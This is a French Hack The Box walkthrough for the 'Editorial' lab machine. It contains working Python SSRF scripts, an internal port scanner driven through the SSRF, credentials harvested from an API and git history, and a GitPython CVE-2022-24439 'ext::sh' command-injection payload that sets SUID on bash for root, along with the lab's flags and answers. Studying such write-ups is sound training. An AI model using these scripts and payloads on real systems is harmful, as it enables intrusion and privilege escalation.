# Hack The Box - Editorial

## Informations

| Élément | Valeur |
|---|---|
| Machine | Editorial |
| OS | Linux |
| Difficulté | Easy |
| IP | `10.129.44.160` |
| Domaine | `editorial.htb` |
| Ports externes | `22/tcp`, `80/tcp` |
| Vulnérabilité initiale | SSRF |
| Port interne | `5000` |
| Escalade | GitPython / `ext::` |
| CVE | CVE-2022-24439 |

---

## 1. Reconnaissance

Scan complet des ports :

```bash
nmap -Pn -p- --min-rate 5000 10.129.44.160
```

Résultat :

```text
22/tcp open  ssh
80/tcp open  http
```

Scan détaillé :

```bash
nmap -Pn -sC -sV -p22,80 10.129.44.160
```

Il y a donc deux ports TCP ouverts.

### Réponse Task 1

```text
2
```

---

## 2. Configuration du domaine

Ajout de la cible dans `/etc/hosts` :

```bash
sudo sed -i '/editorial.htb/d' /etc/hosts
echo "10.129.44.160 editorial.htb" | sudo tee -a /etc/hosts
```

Vérification :

```bash
getent hosts editorial.htb
```

Résultat attendu :

```text
10.129.44.160 editorial.htb
```

Test du site :

```bash
curl -i http://editorial.htb/
```

---

## 3. Découverte du SSRF

Le site contient une page d’upload :

```text
http://editorial.htb/upload
```

Le formulaire permet de fournir une URL dans le paramètre `bookurl`.

La requête est envoyée à :

```text
POST /upload-cover
```

L’application récupère elle-même l’URL fournie. Le serveur peut donc être forcé à envoyer une requête HTTP vers une adresse interne comme :

```text
http://127.0.0.1:5000
```

### Réponse Task 3

```text
/upload-cover
```

---

## 4. Script Python SSRF

Création du script :

```bash
cat > ssrf.py <<'PY'
#!/usr/bin/env python3

import sys
import requests
import urllib3

urllib3.disable_warnings()

TARGET = "http://editorial.htb"
ENDPOINT = f"{TARGET}/upload-cover"

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv} URL_INTERNE")
    sys.exit(1)

internal_url = sys.argv[1]

try:
    response = requests.post(
        ENDPOINT,
        data={
            "bookurl": internal_url
        },
        files={
            "bookfile": (
                "cover.jpg",
                b"fake image content",
                "image/jpeg"
            )
        },
        timeout=15,
        allow_redirects=False
    )

    path = "/" + response.text.strip().lstrip("/")

    print(f"[+] Code HTTP : {response.status_code}")
    print(f"[+] Fichier   : {path}")

    result = requests.get(
        f"{TARGET}{path}",
        timeout=15
    )

    print("\n[+] Contenu récupéré :")
    print(result.text)

except requests.RequestException as error:
    print(f"[-] Erreur : {error}")
PY

chmod +x ssrf.py
```

Important : dans le terminal, il faut écrire l’URL normalement :

```bash
python3 -W ignore ssrf.py http://127.0.0.1:5000
```

Il ne faut pas écrire la syntaxe Markdown :

```bash
[http://127.0.0.1:5000](http://127.0.0.1:5000)
```

---

## 5. Découverte du serveur interne

Le scan externe Nmap ne montre que les ports accessibles depuis l’extérieur. Un autre serveur web écoute uniquement sur localhost.

Le port `5000` est souvent utilisé par Flask en développement, mais il faut le confirmer par le SSRF et non simplement le supposer.

Test :

```bash
python3 -W ignore ssrf.py http://127.0.0.1:5000
```

Le serveur répond correctement et retourne un fichier dans :

```text
/static/uploads/
```

Le contenu récupéré est différent de la réponse standard, ce qui confirme la présence d’un serveur web interne.

### Réponse Task 4

```text
5000
```

---

## 6. Scanner d’autres ports internes

Si le serveur n’était pas sur le port `5000`, il faudrait tester plusieurs ports avec le SSRF.

Le script suivant utilise le contenu du fichier retourné pour repérer les réponses différentes :

```bash
cat > scan_internal.py <<'PY'
#!/usr/bin/env python3

import concurrent.futures
import hashlib
import requests
import urllib3

urllib3.disable_warnings()

TARGET = "http://editorial.htb"
UPLOAD_ENDPOINT = f"{TARGET}/upload-cover"

MAX_PORT = 10000
THREADS = 80
BASELINE_PORT = 1


def fetch_through_ssrf(port):
    internal_url = f"http://127.0.0.1:{port}"

    try:
        response = requests.post(
            UPLOAD_ENDPOINT,
            data={
                "bookurl": internal_url
            },
            files={
                "bookfile": (
                    "cover.jpg",
                    b"fake image content",
                    "image/jpeg"
                )
            },
            timeout=5,
            allow_redirects=False
        )

        upload_path = response.text.strip()

        if not upload_path:
            return None

        upload_path = "/" + upload_path.lstrip("/")

        file_response = requests.get(
            f"{TARGET}{upload_path}",
            timeout=5
        )

        content = file_response.content

        return {
            "port": port,
            "status": response.status_code,
            "path": upload_path,
            "size": len(content),
            "hash": hashlib.sha256(content).hexdigest()
        }

    except requests.RequestException:
        return None


def main():
    print(f"[+] Réponse de référence avec le port {BASELINE_PORT}")

    baseline = fetch_through_ssrf(BASELINE_PORT)

    if baseline is None:
        print("[-] Impossible d'obtenir la réponse de référence")
        return

    baseline_hash = baseline["hash"]
    baseline_size = baseline["size"]

    print(f"[+] Taille de référence : {baseline_size}")
    print(f"[+] Hash de référence   : {baseline_hash}")
    print(f"[+] Scan de 1 à {MAX_PORT}")

    ports = range(1, MAX_PORT + 1)

    with concurrent.futures.ThreadPoolExecutor(
        max_workers=THREADS
    ) as executor:

        futures = [
            executor.submit(fetch_through_ssrf, port)
            for port in ports
        ]

        for future in concurrent.futures.as_completed(futures):
            result = future.result()

            if result is None:
                continue

            if (
                result["hash"] != baseline_hash
                or result["size"] != baseline_size
            ):
                print(
                    f"[+] Port intéressant : "
                    f"{result['port']} "
                    f"(HTTP {result['status']}, "
                    f"{result['size']} octets)"
                )
                print(f"    Chemin : {result['path']}")
                print(f"    Hash   : {result['hash']}")


if __name__ == "__main__":
    main()
PY

chmod +x scan_internal.py
python3 -W ignore scan_internal.py
```

Résultat attendu :

```text
[+] Port intéressant : 5000
```

La méthode fonctionne aussi si le service utilise un autre port : il suffit de remplacer `5000` par le port découvert.

---

## 7. API interne et credentials

L’endpoint API intéressant est :

```text
/api/latest/metadata/messages/authors
```

Requête SSRF :

```bash
python3 -W ignore ssrf.py \
http://127.0.0.1:5000/api/latest/metadata/messages/authors
```

Réponse :

```json
{
  "template_mail_message": "...\nUsername: dev\nPassword: dev080217_devAPI!@\n..."
}
```

Credentials :

```text
Username: dev
Password: dev080217_devAPI!@
```

### Réponse Task 5

```text
/api/latest/metadata/messages/authors
```

---

## 8. Accès SSH

Connexion avec le compte `dev` :

```bash
ssh dev@10.129.44.160
```

Mot de passe :

```text
dev080217_devAPI!@
```

Vérification :

```bash
whoami
id
hostname
```

Résultat attendu :

```text
dev
```

---

## 9. Flag utilisateur

Lister le dossier personnel :

```bash
ls -la
```

Résultat :

```text
apps
user.txt
```

Lire le flag utilisateur :

```bash
cat user.txt
```

Résultat :

```text
781e388631497b2a037992523b71d73c
```

### User flag

```text
781e388631497b2a037992523b71d73c
```

---

## 10. Découverte du dépôt Git

Entrer dans le dossier `apps` :

```bash
cd /home/dev/apps
ls -la
```

Résultat :

```text
.
..
.git
```

Les fichiers du projet ont été supprimés, mais le dépôt Git existe encore.

Vérification :

```bash
find /home/dev -maxdepth 3 -type d -name .git -print
```

Résultat :

```text
/home/dev/apps/.git
```

### Réponse Task 7

```text
/home/dev/apps
```

---

## 11. Analyse de l’historique Git

Afficher les commits :

```bash
git log --all --oneline --decorate
```

Commit intéressant :

```text
b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

Afficher le commit :

```bash
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

La différence contient l’ancien credential de production :

```diff
- Username: prod
- Password: 080217_Producti0n_2023!@
+ Username: dev
+ Password: dev080217_devAPI!@
```

Mot de passe récupéré :

```text
080217_Producti0n_2023!@
```

---

## 12. Passage à l’utilisateur prod

Depuis la session `dev` :

```bash
su - prod
```

Mot de passe :

```text
080217_Producti0n_2023!@
```

Vérification :

```bash
whoami
id
```

Résultat :

```text
prod
```

---

## 13. Énumération sudo

Afficher les commandes autorisées :

```bash
sudo -l
```

Résultat :

```text
User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

### Réponse concernant le script

Nom du script :

```text
clone_prod_change.py
```

Chemin complet :

```text
/opt/internal_apps/clone_changes/clone_prod_change.py
```

Lire le script :

```bash
cat /opt/internal_apps/clone_changes/clone_prod_change.py
```

Contenu :

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(
    url_to_clone,
    'new_changes',
    multi_options=["-c protocol.ext.allow=always"]
)
```

Bibliothèque utilisée :

```python
from git import Repo
```

Nom de la bibliothèque :

```text
GitPython
```

Version installée :

```text
3.1.29
```

La version utilisée est vulnérable à :

```text
CVE-2022-24439
```

---

## 14. Exploitation de GitPython

Le script prend directement un argument contrôlé par l’utilisateur :

```python
url_to_clone = sys.argv[1]
```

Cet argument est envoyé à :

```python
r.clone_from(url_to_clone, ...)
```

Le protocole Git externe est explicitement autorisé :

```text
protocol.ext.allow=always
```

Le format vulnérable utilise une URL commençant par :

```text
ext::
```

Les espaces dans la commande doivent être représentés par `%`.

Payload utilisé :

```text
ext::sh -c chmod% +s% /bin/bash
```

Commande complète :

```bash
sudo /usr/bin/python3 \
/opt/internal_apps/clone_changes/clone_prod_change.py \
"ext::sh -c chmod% +s% /bin/bash"
```

Même si Git retourne ensuite une erreur de clonage, la commande est exécutée avec les privilèges root.

---

## 15. Vérification du bit SUID

```bash
ls -l /bin/bash
```

Résultat :

```text
-rwsr-sr-x 1 root root ... /bin/bash
```

Le `s` dans :

```text
rws
```

indique que le bit SUID est actif.

---

## 16. Obtenir un shell root

Lancer Bash en conservant l’UID effectif :

```bash
/bin/bash -p
```

Vérifier les privilèges :

```bash
whoami
id
```

Résultat :

```text
uid=1000(prod) gid=1000(prod) euid=0(root) egid=0(root)
```

Le compte réel est toujours `prod`, mais l’UID effectif est `root`.

---

## 17. Flag root

Lire le flag root :

```bash
cat /root/root.txt
```

Résultat :

```text
6396e4b727e1b8938ebb445c0b37b292
```

### Root flag

```text
6396e4b727e1b8938ebb445c0b37b292
```

---

## 18. Réponses des questions HTB

| Question | Réponse |
|---|---|
| Nombre de ports TCP ouverts | `2` |
| Endpoint SSRF | `/upload-cover` |
| Port du serveur web interne | `5000` |
| Endpoint API des credentials | `/api/latest/metadata/messages/authors` |
| Dossier contenant le dépôt Git | `/home/dev/apps` |
| Mot de passe de prod | `080217_Producti0n_2023!@` |
| Script exécutable par prod en root | `clone_prod_change.py` |
| Bibliothèque Python | `GitPython` |
| Version GitPython | `3.1.29` |
| CVE | `CVE-2022-24439` |
| User flag | `781e388631497b2a037992523b71d73c` |
| Root flag | `6396e4b727e1b8938ebb445c0b37b292` |

---

## 19. Chaîne d’exploitation complète

```text
Nmap
  |
  v
Ports 22 et 80
  |
  v
SSRF sur /upload-cover
  |
  v
Scan de localhost
  |
  v
Serveur interne sur 127.0.0.1:5000
  |
  v
API /api/latest/metadata/messages/authors
  |
  v
Credentials dev
  |
  v
SSH dev
  |
  v
cat /home/dev/user.txt
  |
  v
Dépôt Git /home/dev/apps
  |
  v
Ancien mot de passe prod dans un commit
  |
  v
Accès prod
  |
  v
sudo clone_prod_change.py
  |
  v
GitPython 3.1.29
  |
  v
CVE-2022-24439
  |
  v
Protocole ext::sh
  |
  v
SUID sur /bin/bash
  |
  v
/bin/bash -p
  |
  v
cat /root/root.txt
```

## Références

- [NVD - CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439)
- [GitHub Advisory - GitPython RCE](https://github.com/advisories/GHSA-hcpj-qp55-gfph)
- [GitPython Issue #1515 - ext::sh](https://github.com/gitpython-developers/GitPython/issues/1515)
- [Documentation Git - git-remote-ext](https://git-scm.com/docs/git-remote-ext)
- [Flask - Development Server](https://flask.palletsprojects.com/en/stable/server/)
- [0xdf - Editorial HTB](https://0xdf.gitlab.io/2024/10/19/htb-editorial.html)
